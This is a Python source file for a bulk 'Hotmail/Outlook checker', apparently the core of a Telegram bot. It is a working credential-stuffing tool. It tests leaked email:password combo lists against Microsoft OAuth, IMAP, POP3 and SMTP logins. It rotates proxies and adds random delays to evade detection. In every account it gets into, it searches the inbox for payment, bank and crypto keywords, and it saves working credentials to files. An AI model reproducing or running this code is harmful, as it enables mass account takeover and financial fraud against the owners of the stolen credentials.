#!/usr/bin/env python3
"""
Hotmail/Outlook Checker Core Logic
Refactored for Telegram Bot integration with Elite specifications.
"""

import asyncio
import aiohttp
import json
import os
import time
import random
import re
import socket
import urllib.parse
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

@dataclass
class Config:
    """Configuration class"""
    threads: int = 50
    timeout: int = 30
    retries: int = 3
    proxy_type: str = "http"
    check_inbox: bool = True
    search_keywords: List[str] = None

    use_legacy_auth: bool = True
    imap_ssl: bool = True
    pop3_ssl: bool = True
    smtp_starttls: bool = True
    oauth_enabled: bool = True
    graph_api_enabled: bool = True

    random_delay: bool = True
    min_delay: float = 0.5
    max_delay: float = 2.0

    def __post_init__(self):
        if self.search_keywords is None:
            self.search_keywords = [
                "paypal", "bank", "credit", "card", "invoice", "payment",
                "amazon", "ebay", "coinbase", "bitcoin", "crypto"
            ]

# ============================================================================
# MICROSOFT AUTHENTICATION MODULES
# ============================================================================

class MicrosoftAuth:
    """Microsoft authentication handler"""

    ENDPOINTS = {
        'authorize': 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
        'token': 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        'graph_me': 'https://graph.microsoft.com/v1.0/me',
        'graph_inbox': 'https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages',
    }

    SERVERS = {
        'imap': {
            'outlook.office365.com': 993,
            'imap-mail.outlook.com': 993,
            'imap.outlook.com': 993
        },
        'pop3': {
            'outlook.office365.com': 995,
            'pop-mail.outlook.com': 995,
            'pop.outlook.com': 995
        },
        'smtp': {
            'smtp.office365.com': 587,
            'smtp-mail.outlook.com': 587,
            'smtp.live.com': 587
        }
    }

    def __init__(self, config: Config, session: aiohttp.ClientSession):
        self.config = config
        self.session = session

    async def legacy_authenticate(self, email: str, password: str, proxy: str = None):
        """Legacy authentication method (IMAP/POP3/SMTP) - Non-blocking"""
        results = {}
        loop = asyncio.get_running_loop()

        # If proxy is required, we cannot use legacy auth safely with standard libraries
        if proxy:
            return results

        # Try IMAP first
        imap_result = await loop.run_in_executor(None, self._check_imap, email, password)
        if imap_result['success']:
            results['imap'] = imap_result
            return results

        # Try POP3
        pop3_result = await loop.run_in_executor(None, self._check_pop3, email, password)
        if pop3_result['success']:
            results['pop3'] = pop3_result
            return results

        # Try SMTP
        smtp_result = await loop.run_in_executor(None, self._check_smtp, email, password)
        if smtp_result['success']:
            results['smtp'] = smtp_result
            return results

        return results

    def _check_imap(self, email: str, password: str):
        """IMAP authentication check (Blocking, run in executor)"""
        import imaplib

        result = {
            'success': False,
            'protocol': 'IMAP',
            'server': '',
            'error': '',
            'inbox_count': 0,
            'keywords_found': []
        }

        for server, port in self.SERVERS['imap'].items():
            try:
                if self.config.imap_ssl:
                    imap = imaplib.IMAP4_SSL(server, port, timeout=self.config.timeout)
                else:
                    imap = imaplib.IMAP4(server, port, timeout=self.config.timeout)

                imap.login(email, password)
                result['success'] = True
                result['server'] = f"{server}:{port}"

                imap.select('INBOX')

                # Get total count
                typ, data = imap.search(None, 'ALL')
                if typ == 'OK' and data[0]:
                    result['inbox_count'] = len(data[0].split())

                # Check keywords if configured
                if self.config.check_inbox and self.config.search_keywords:
                    found_keywords = []
                    for keyword in self.config.search_keywords:
                        try:
                            # Search Subject
                            typ, data = imap.search(None, f'(SUBJECT "{keyword}")')
                            if typ == 'OK' and data[0]:
                                found_keywords.append(keyword)
                                continue

                            # Search Body
                            typ, data = imap.search(None, f'(BODY "{keyword}")')
                            if typ == 'OK' and data[0]:
                                found_keywords.append(keyword)
                        except:
                            pass
                    result['keywords_found'] = found_keywords

                imap.logout()
                break

            except Exception as e:
                error_str = str(e)
                result['error'] = error_str
                if 'AUTHENTICATIONFAILED' in error_str.upper():
                    break
                elif 'too many bad auth attempts' in error_str:
                    result['error'] = 'Account locked'
                    break
                continue

        return result

    def _check_pop3(self, email: str, password: str):
        """POP3 authentication check (Blocking, run in executor)"""
        import poplib

        result = {
            'success': False,
            'protocol': 'POP3',
            'server': '',
            'error': '',
            'message_count': 0
        }

        for server, port in self.SERVERS['pop3'].items():
            try:
                if self.config.pop3_ssl:
                    pop = poplib.POP3_SSL(server, port, timeout=self.config.timeout)
                else:
                    pop = poplib.POP3(server, port, timeout=self.config.timeout)

                pop.user(email)
                pop.pass_(password)
                result['success'] = True
                result['server'] = f"{server}:{port}"
                result['message_count'] = len(pop.list()[1])
                pop.quit()
                break

            except Exception as e:
                error_str = str(e)
                result['error'] = error_str
                if '-ERR Authentication failed' in error_str:
                    break
                continue

        return result

    def _check_smtp(self, email: str, password: str):
        """SMTP authentication check (Blocking, run in executor)"""
        import smtplib

        result = {
            'success': False,
            'protocol': 'SMTP',
            'server': '',
            'error': ''
        }

        for server, port in self.SERVERS['smtp'].items():
            try:
                smtp = smtplib.SMTP(server, port, timeout=self.config.timeout)
                if self.config.smtp_starttls:
                    smtp.starttls()

                smtp.login(email, password)
                result['success'] = True
                result['server'] = f"{server}:{port}"
                smtp.quit()
                break

            except smtplib.SMTPAuthenticationError:
                result['error'] = 'Authentication failed'
                break
            except Exception as e:
                result['error'] = str(e)
                continue

        return result

    async def oauth_authenticate(self, email: str, password: str, proxy: str = None):
        """OAuth 2.0 authentication"""
        try:
            auth_params = {
                'client_id': '00000002-0000-0ff1-ce00-000000000000',
                'response_type': 'code',
                'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                'scope': 'https://outlook.office.com/IMAP.AccessAsUser.All offline_access',
                'response_mode': 'query',
                'prompt': 'login'
            }

            auth_url = f"{self.ENDPOINTS['authorize']}?{urllib.parse.urlencode(auth_params)}"

            # Use proxy for requests
            req_kwargs = {'proxy': proxy} if proxy else {}

            async with self.session.get(auth_url, **req_kwargs) as response:
                html = await response.text()

                sft_match = re.search(r'name="sFT" value="([^"]+)"', html)
                sft = sft_match.group(1) if sft_match else ""

                if not sft:
                    return {'success': False, 'error': 'No sFT token found'}

            login_data = {
                'login': email,
                'passwd': password,
                'PPFT': sft,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i3': '36728',
                'm1': '768',
                'm2': '1184',
                'm3': '0',
                'i12': '1',
                'i17': '0',
                'i18': '__Login_Host|1'
            }

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            async with self.session.post(
                'https://login.live.com/ppsecure/post.srf',
                data=login_data,
                headers=headers,
                allow_redirects=False,
                **req_kwargs
            ) as response:

                if response.status == 302:
                    redirect_url = response.headers.get('Location', '')
                    code_match = re.search(r'code=([^&]+)', redirect_url)

                    if code_match:
                        auth_code = code_match.group(1)

                        token_data = {
                            'client_id': '00000002-0000-0ff1-ce00-000000000000',
                            'code': auth_code,
                            'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                            'grant_type': 'authorization_code'
                        }

                        async with self.session.post(
                            self.ENDPOINTS['token'],
                            data=token_data,
                            headers=headers,
                            **req_kwargs
                        ) as token_response:

                            token_json = await token_response.json()
                            if 'access_token' in token_json:
                                return {
                                    'success': True,
                                    'access_token': token_json['access_token'],
                                    'refresh_token': token_json.get('refresh_token', '')
                                }

                return {'success': False, 'error': 'OAuth authentication failed'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def graph_api_check(self, access_token: str, proxy: str = None):
        """Check account via Microsoft Graph API"""
        try:
            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            req_kwargs = {'proxy': proxy} if proxy else {}

            async with self.session.get(self.ENDPOINTS['graph_me'], headers=headers, **req_kwargs) as response:
                if response.status == 200:
                    profile = await response.json()

                    async with self.session.get(
                        self.ENDPOINTS['graph_inbox'],
                        headers=headers,
                        params={'$top': 50},
                        **req_kwargs
                    ) as inbox_response:

                        inbox_data = await inbox_response.json() if inbox_response.status == 200 else {}
                        inbox_count = len(inbox_data.get('value', []))

                        keywords_found = []
                        if self.config.check_inbox and self.config.search_keywords:
                            for keyword in self.config.search_keywords:
                                search_params = {
                                    '$search': f'"{keyword}"',
                                    '$top': 1,
                                    '$select': 'id'
                                }
                                async with self.session.get(
                                    self.ENDPOINTS['graph_inbox'],
                                    headers=headers,
                                    params=search_params,
                                    **req_kwargs
                                ) as search_resp:
                                    if search_resp.status == 200:
                                        data = await search_resp.json()
                                        if data.get('value'):
                                            keywords_found.append(keyword)

                        return {
                            'success': True,
                            'profile': profile,
                            'inbox_count': inbox_count,
                            'keywords_found': keywords_found,
                            'email': profile.get('mail') or profile.get('userPrincipalName', '')
                        }

                return {'success': False, 'error': f'Graph API error: {response.status}'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def check_account(self, email: str, password: str, proxy: str = None):
        """Full account check"""
        result = {
            'email': email,
            'password': password,
            'valid': False,
            'method': '',
            'details': {},
            'inbox_count': 0,
            'keywords_found': [],
            'country': self._detect_country(email),
            'account_type': self._detect_account_type(email),
            'timestamp': datetime.now().isoformat()
        }

        start_time = time.time()

        try:
            # Try OAuth
            if self.config.oauth_enabled:
                oauth_result = await self.oauth_authenticate(email, password, proxy=proxy)
                if oauth_result['success']:
                    result['valid'] = True
                    result['method'] = 'OAuth'
                    result['details'] = oauth_result

                    if self.config.graph_api_enabled:
                        graph_result = await self.graph_api_check(oauth_result['access_token'], proxy=proxy)
                        if graph_result['success']:
                            result['inbox_count'] = graph_result.get('inbox_count', 0)
                            result['keywords_found'] = graph_result.get('keywords_found', [])
                            result['details']['graph'] = graph_result

                    result['response_time'] = time.time() - start_time
                    return result

            # Try Legacy
            if self.config.use_legacy_auth:
                legacy_result = await self.legacy_authenticate(email, password, proxy=proxy)

                for protocol, proto_result in legacy_result.items():
                    if proto_result['success']:
                        result['valid'] = True
                        result['method'] = protocol
                        result['details'] = proto_result
                        result['inbox_count'] = proto_result.get('inbox_count',
                                                               proto_result.get('message_count', 0))
                        result['keywords_found'] = proto_result.get('keywords_found', [])
                        break

            if not result['valid']:
                result['method'] = 'Failed'
                result['details'] = {'error': 'All authentication methods failed'}

            result['response_time'] = time.time() - start_time
            return result

        except Exception as e:
            result['method'] = 'Error'
            result['details'] = {'error': str(e)}
            result['response_time'] = time.time() - start_time
            return result

    def _detect_country(self, email: str) -> str:
        domain = email.split('@')[-1].lower()
        country_map = {'.co.uk': 'UK', '.de': 'DE', '.fr': 'FR', '.it': 'IT', '.es': 'ES',
                       '.nl': 'NL', '.pl': 'PL', '.ru': 'RU', '.br': 'BR', '.au': 'AU',
                       '.ca': 'CA', '.in': 'IN', '.jp': 'JP', '.kr': 'KR', '.cn': 'CN'}
        for ext, country in country_map.items():
            if domain.endswith(ext):
                return country
        return 'US' if '.com' in domain else 'Unknown'

    def _detect_account_type(self, email: str) -> str:
        domain = email.split('@')[-1].lower()
        if domain in ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']:
            return 'Consumer'
        elif any(x in domain for x in ['.onmicrosoft.com', '.sharepoint.com']):
            return 'Business'
        return 'Unknown'

# ============================================================================
# PROXY MANAGER
# ============================================================================

class ProxyManager:
    """Proxy manager with advanced parsing"""

    def __init__(self, proxies: List[str], config: Config):
        self.config = config
        self.proxies = self._parse_proxies(proxies)
        self.current_index = 0
        self.bad_proxies = set()

    def _parse_proxies(self, raw_proxies: List[str]) -> List[str]:
        """
        Parse proxies into aiohttp compatible format:
        http://user:pass@host:port
        """
        parsed = []
        for p in raw_proxies:
            p = p.strip()
            if not p or p.startswith('#'):
                continue

            # Remove protocol prefix if present
            clean_p = re.sub(r'^(http|https|socks4|socks5)://', '', p)

            parts = clean_p.split(':')
            if len(parts) == 2:
                # ip:port
                parsed.append(f"http://{parts[0]}:{parts[1]}")
            elif len(parts) == 4:
                # ip:port:user:pass
                parsed.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
            else:
                # Assume already in correct format or unknown
                if '://' in p:
                    parsed.append(p)
                else:
                    parsed.append(f"http://{p}")
        return parsed

    def get_proxy(self):
        """Get next proxy"""
        if not self.proxies:
            return None

        start_index = self.current_index
        while True:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)

            if proxy not in self.bad_proxies:
                return proxy

            if self.current_index == start_index:
                self.bad_proxies.clear()
                return self.proxies[0]

# ============================================================================
# MAIN CHECKER
# ============================================================================

class HotmailCheckerV77:
    """Core Checker Class"""

    def __init__(self, combos: List[str], proxies: List[str] = None, config_dict: Dict = None):
        self.config = Config(**(config_dict or {}))
        self.combos = self._parse_combos(combos)
        self.proxies = proxies or []
        self.auth = None
        self.proxy_manager = ProxyManager(self.proxies, self.config)

        self.results = {
            'valid': [],
            'invalid': [],
            'custom': [],  # 2FA
            'locked': [],
            'unknown': []
        }
        self.stats = {
            'total': len(self.combos),
            'checked': 0,
            'valid': 0,
            'invalid': 0,
            'custom': 0,
            'locked': 0,
            'start_time': time.time(),
            'is_running': False
        }

    def _parse_combos(self, combo_lines: List[str]):
        parsed = []
        for line in combo_lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            for delim in [':', ';', '|', '\t']:
                if delim in line:
                    parts = line.split(delim, 1)
                    if len(parts) == 2:
                        email = parts[0].strip()
                        password = parts[1].strip()
                        if '@' in email:
                            parsed.append((email, password))
                    break
        return parsed

    async def check_single(self, email: str, password: str):
        """Check a single account"""
        if self.config.random_delay:
            await asyncio.sleep(random.uniform(self.config.min_delay, self.config.max_delay))

        proxy = self.proxy_manager.get_proxy()

        try:
            result = await self.auth.check_account(email, password, proxy=proxy)
            self._categorize_result(result)
            self.stats['checked'] += 1
            return result
        except Exception as e:
            return None

    def _categorize_result(self, result):
        if not result.get('valid', False):
            error_msg = str(result.get('details', {}).get('error', '')).lower()
            if 'locked' in error_msg or 'suspended' in error_msg:
                category = 'locked'
            elif '2fa' in error_msg or 'two-factor' in error_msg or 'mfa' in error_msg:
                category = 'custom'
            elif 'invalid' in error_msg or 'authentication' in error_msg:
                category = 'invalid'
            else:
                category = 'unknown'
        else:
            category = 'valid'
            self.stats['valid'] += 1

        self.results[category].append(result)
        if category != 'valid':
            self.stats[category] += 1

    async def run(self, update_callback: Callable = None):
        """Run the checker"""
        self.stats['is_running'] = True
        self.stats['start_time'] = time.time()

        # Use single connector/session for pooling
        connector = aiohttp.TCPConnector(ssl=False, limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            self.auth = MicrosoftAuth(self.config, session)

            semaphore = asyncio.Semaphore(self.config.threads)

            async def worker(email, password):
                if not self.stats['is_running']:
                    return
                async with semaphore:
                    await self.check_single(email, password)
                    if update_callback:
                        # Call update callback, it will throttle itself
                        if asyncio.iscoroutinefunction(update_callback):
                            await update_callback(self.stats)
                        else:
                            update_callback(self.stats)

            # Create all tasks
            tasks = [asyncio.create_task(worker(email, pw)) for email, pw in self.combos]

            try:
                # Use gather to wait for all
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                # Handle forced stop
                self.stats['is_running'] = False
                # Cancel remaining tasks
                for t in tasks:
                    if not t.done():
                        t.cancel()

            self.stats['is_running'] = False

    def stop(self):
        """Stop the checker"""
        self.stats['is_running'] = False

    def generate_results_files(self, output_dir: str):
        """Generate plain text result files"""
        os.makedirs(output_dir, exist_ok=True)
        files = []

        for category, results in self.results.items():
            if results:
                filepath = os.path.join(output_dir, f"{category}.txt")
                with open(filepath, 'w') as f:
                    for r in results:
                        keywords = ",".join(r.get('keywords_found', []))
                        kw_str = f" | Keywords: {keywords}" if keywords else ""
                        f.write(f"{r['email']}:{r['password']} | Inbox: {r['inbox_count']} | Country: {r['country']}{kw_str}\n")
                files.append(filepath)

        # Also JSON summary
        summary_path = os.path.join(output_dir, "summary.json")
        with open(summary_path, 'w') as f:
            simple_stats = self.stats.copy()
            json.dump(simple_stats, f, indent=2, default=str)
        files.append(summary_path)

        return files
